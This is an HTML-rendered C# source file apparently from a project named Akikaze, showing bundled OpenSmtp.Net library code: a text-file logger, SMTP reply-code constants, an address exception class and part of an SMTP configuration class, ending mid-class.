<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Akikaze - akikaze2.cs.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc15 {
	color: #008080;
}
.sc16 {
	color: #8000FF;
}
.sc18 {
	color: #008080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; version 2 only.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/</span><span class="sc0">



</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Globalization</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">RegularExpressions</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">.</span><span class="sc11">Sockets</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc3">/****************************************************************************
 *                                      *
 *              SMTP-Library                    *
 *              Taken from OpenSMTP                 *
 *        Entire project relicensed under GPLv2             *
 *                                      *
 *                                      *
 *                START                     *
 *                                      *
 *                                      *
 ****************************************************************************/</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
 
    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This is a Log class. You can log text messages to a 
</span><span class="sc0">    </span><span class="sc15">/// text file and/or the event log
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Log</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">Log</span><span class="sc10">()</span><span class="sc0"> 
        </span><span class="sc10">{}</span><span class="sc0">
        
        </span><span class="sc3">/**
        * Logs string message to TextFile
        */</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">logToTextFile</span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// If the log file exists make sure it is not over the maximum allowable size
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">).</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">LogMaxSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">WriteToFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">WriteToFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"An exception occured in logToTextFile: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Null value supplied to Log.logToTextFile()."</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WriteToFile</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StreamWriter</span><span class="sc0"> </span><span class="sc11">sw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StreamWriter</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type is used to store known SMTP responses specified by RFC 821 and 2821
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">SYSTEM_STATUS</span><span class="sc0">                 </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"211"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">HELP_MSG</span><span class="sc0">                      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"214"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">HELO_REPLY</span><span class="sc0">                    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"220"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">QUIT</span><span class="sc0">                          </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"221"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">AUTH_SUCCESSFUL</span><span class="sc0">               </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"235"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">OK</span><span class="sc0">                            </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"250"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">NOT_LOCAL_WILL_FORWARD</span><span class="sc0">        </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"251"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">SERVER_CHALLENGE</span><span class="sc0">              </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"334"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">START_INPUT</span><span class="sc0">                   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"354"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">SERVICE_NOT_AVAILABLE</span><span class="sc0">         </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"421"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">MAILBOX_BUSY</span><span class="sc0">                  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"450"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ERROR_PROCESSING</span><span class="sc0">              </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"451"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">INSUFFICIENT_STORAGE</span><span class="sc0">          </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"452"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">UNKNOWN</span><span class="sc0">                       </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"500"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">SYNTAX_ERROR</span><span class="sc0">                  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"501"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">CMD_NOT_IMPLEMENTED</span><span class="sc0">           </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"502"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">BAD_SEQUENCE</span><span class="sc0">                  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"503"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">NOT_IMPLEMENTED</span><span class="sc0">               </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"504"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">SECURITY_ERROR</span><span class="sc0">                </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"505"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ACTION_NOT_TAKEN</span><span class="sc0">              </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"550"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">NOT_LOCAL_PLEASE_FORWARD</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"551"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">EXCEEDED_STORAGE_ALLOWANCE</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"552"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">MAILBOX_NAME_NOT_ALLOWED</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"553"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">TRANSACTION_FAILED</span><span class="sc0">            </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"554"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">PIPELINING</span><span class="sc0">                    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"PIPELINING"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This is an System.Exception class for handling
</span><span class="sc0">    </span><span class="sc15">/// an invalid RFC 822 EmailAddress.&lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">MalformedAddressException</span><span class="sc10">:</span><span class="sc11">ApplicationException</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MalformedAddressException</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">base</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MalformedAddressException</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">inner</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">base</span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">,</span><span class="sc11">inner</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">   
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This type stores configuration information for the smtp component.
</span><span class="sc0">    </span><span class="sc15">/// WARNING: If you turn on logging the caller must have proper permissions
</span><span class="sc0">    </span><span class="sc15">/// and the log file will grow very quickly if a lot of email messages are 
</span><span class="sc0">    </span><span class="sc15">/// being sent. PLEASE USE THE LOGGING FEATURE FOR DEBUGGING ONLY.
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">SmtpConfig</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">SmtpConfig</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{}</span><span class="sc0">
        
        </span><span class="sc15">///&lt;value&gt;Stores the default SMTP host&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">    </span><span class="sc11">SmtpHost</span><span class="sc0">            </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"localhost"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc15">///&lt;value&gt;Stores the default SMTP port&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">       </span><span class="sc11">SmtpPort</span><span class="sc0">            </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc15">///&lt;value&gt;Flag used for turning on and off logging to a text file.
</span><span class="sc0">        </span><span class="sc15">/// The caller must have proper permissions for this to work&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0">      </span><span class="sc11">LogToText</span><span class="sc0">           </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc15">///&lt;value&gt;Path to use when logging to a text file. 
</span><span class="sc0">        </span><span class="sc15">/// The caller must have proper permissions for this to work&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">    </span><span class="sc11">LogPath</span><span class="sc0">             </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"../logs/SmtpLog.txt"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0">      </span><span class="sc11">LogMaxSize</span><span class="sc0">          </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1048576</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// one meg
</span><span class="sc0">        
        </span><span class="sc15">///&lt;value&gt;Path used to store temp files used when sending email messages.
</span><span class="sc0">        </span><span class="sc15">/// The default value is the temp directory specified in the Environment variables.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">    </span><span class="sc11">TempPath</span><span class="sc0">            </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetTempPath</span><span class="sc10">();</span><span class="sc0">
        
        </span><span class="sc15">///&lt;value&gt;Flag used to turn on and off address format verification.
</span><span class="sc0">        </span><span class="sc15">/// If it is turned on all addresses must meet RFC 822 format.
</span><span class="sc0">        </span><span class="sc15">/// The default value is false.
</span><span class="sc0">        </span><span class="sc15">/// WARNING: Turning this on will decrease performance.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0">      </span><span class="sc11">VerifyAddresses</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">///&lt;value&gt;Version of this OpenSmtp SMTP .Net component&lt;/value&gt;
